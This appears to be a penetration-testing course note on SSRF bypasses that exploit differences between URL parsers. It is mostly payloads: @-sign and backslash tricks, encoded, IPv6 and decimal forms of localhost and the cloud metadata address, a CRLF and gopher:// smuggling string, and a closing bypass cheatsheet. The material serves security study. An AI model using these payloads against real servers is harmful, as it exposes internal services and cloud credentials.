---
tags: [vapt, ssrf, intermediate]
difficulty: intermediate
module: "13 - SSRF"
topic: "13.16 SSRF — URL Parser Confusion"
---

# 13.16 — SSRF URL Parser Confusion

## The Problem: URL Parsing Is Not Standardized

```
DIFFERENT LIBRARIES PARSE URLS DIFFERENTLY!
If the VALIDATOR uses one parser and the HTTP CLIENT uses another,
an attacker can craft a URL that BOTH parsers see differently!

VALIDATOR:   "This URL points to target.com → safe!"
HTTP CLIENT: "This URL points to 127.0.0.1 → fetches local!"

THIS IS THE BYPASS!
```

---

## Bypass 1 — @ Sign (Authority Confusion)

```
URL FORMAT WITH AUTH:
  http://user:pass@host/path
  
  @ separates credentials from hostname
  
CONFUSION:
  http://expected.com@127.0.0.1/admin
  
  VALIDATOR (naive parse): host = expected.com → ALLOWED!
  HTTP CLIENT: user = expected.com, host = 127.0.0.1 → fetches 127.0.0.1!
  
MORE EXAMPLES:
  http://target.com@169.254.169.254/latest/meta-data/
  → Filter: sees target.com as host → OK!
  → Library: credentials=target.com, host=169.254.169.254 → fetches metadata!
  
  http://expected.com:password@127.0.0.1/
  http://127.0.0.1@target.com/
  (reversed — depends on parser ambiguity)
```

---

## Bypass 2 — Backslash (\)

```
SOME URL PARSERS TREAT \ THE SAME AS /:
  http://127.0.0.1\@target.com/
  → Some parsers: host = target.com → safe!
  → Some HTTP libraries: host = 127.0.0.1 → SSRF!

  http:\\127.0.0.1/admin
  → Some parsers: invalid scheme → blocked
  → Some parsers: treat as http://127.0.0.1/admin → SSRF!

CURL EXAMPLE:
  curl "http://127.0.0.1\:80@target.com/path"
  → curl interprets this as: host=target.com, auth=127.0.0.1\:80
  → OR: host=127.0.0.1, port=80 depending on version!
```

---

## Bypass 3 — Fragment (#)

```
FRAGMENT IS NOT SENT TO SERVER:
  http://evil.com#target.com/allowed
  
  Fragment (#target.com/allowed) is for browser only, not server.
  Server receives: GET / HTTP/1.1
  
  FILTER CONFUSION:
  Some naive filters see: "target.com/allowed" in the URL → allowed!
  HTTP library: fetches evil.com (correct behavior) but filter was fooled!
  
  IN SSRF CONTEXT:
  url=http://169.254.169.254#expected.com/
  → Filter: expected.com is present → OK? (bad filter logic)
  → Library: fetches 169.254.169.254 (fragment ignored)
```

---

## Bypass 4 — Unicode/Homoglyphs

```
SOME FILTERS ARE CASE-SENSITIVE OR ENCODING-SENSITIVE:

UNICODE NORMALIZATION:
  ⓛⓞⓒⓐⓛⓗⓞⓢⓣ → normalizes to localhost in some systems
  
  url=http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/admin
  → Filter: "localhost" not present → allowed!
  → After normalization: connects to localhost → SSRF!

URL ENCODING:
  http://127%2E0%2E0%2E1/ → 127.0.0.1 (dots URL encoded)
  http://%31%32%37%2E%30%2E%30%2E%31/ → 127.0.0.1 (all encoded)
  http://127.0.0.%31/ → might work in some parsers

MIXED ENCODING:
  http://127.0.0.1%09/ → tab after IP (some parsers ignore trailing chars)
```

---

## Bypass 5 — IPv6 Representation Confusion

```
FILTER BLOCKS: 127.0.0.1

TRY:
  http://[::1]/ → IPv6 localhost
  http://[::ffff:127.0.0.1]/ → IPv4-mapped IPv6
  http://[0:0:0:0:0:0:0:1]/ → full IPv6 form
  http://[::1]:80/ → with port
  
FILTER BLOCKS: 169.254.169.254

TRY:
  http://[::ffff:169.254.169.254]/ → IPv4-mapped IPv6
  http://[::ffff:a9fe:a9fe]/ → hex IPv4-mapped
  http://[fd00:ec2::254]/ → AWS uses this in some regions
  
PYTHON URLLIB QUIRK:
  urllib.request.urlopen('http://[::ffff:169.254.169.254]/')
  → Many Python versions follow this → SSRF!
```

---

## Bypass 6 — CRLF in URL / HTTP Header Injection

```
IF SSRF URL IS USED IN AN HTTP HEADER:
  Example: app sets header: X-Target-URL: {user_input}
  
  url = http://169.254.169.254/%0d%0aX-Injected: yes
  
  → CRLF injection in header value → header injection!
  → Could change Host, inject cookies, etc.
  → Combine with request splitting for more impact

url = gopher://127.0.0.1:80/_%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0a
  → Gopher sends raw HTTP request to localhost:80
  → Gets /admin content via HTTP
```

---

## Comprehensive SSRF Bypass Cheatsheet

```
BYPASS TECHNIQUE              EXAMPLE
─────────────────────────────────────────────────────────────────
@ sign confusion              http://target.com@127.0.0.1/
Backslash confusion           http://127.0.0.1\@target.com/
Decimal IP                    http://2130706433/ (127.0.0.1)
Decimal metadata              http://2852039166/ (169.254.169.254)
Hex IP                        http://0x7f000001/
Octal IP                      http://0177.0.0.1/
Short IP                      http://127.1/ http://127.0.1/
IPv6 localhost                http://[::1]/
IPv6 metadata                 http://[::ffff:169.254.169.254]/
nip.io wildcard DNS           http://127.0.0.1.nip.io/
URL encoding (dots)           http://127%2E0%2E0%2E1/
Unicode normalization         http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/
DNS rebinding                 Timing attack (see note 15)
Open redirect chain           http://target.com/redirect?to=http://127.0.0.1/
Protocol change               gopher:// file:// dict://
```

---

## Related Notes
- [[14 - SSRF Localhost Bypass]] — IP filter bypass
- [[15 - SSRF DNS Rebinding]] — DNS-based bypass
- [[17 - SSRF WAF Bypass]] — WAF-specific bypass
- [[13 - SSRF Protocol Smuggling]] — protocol-level bypass
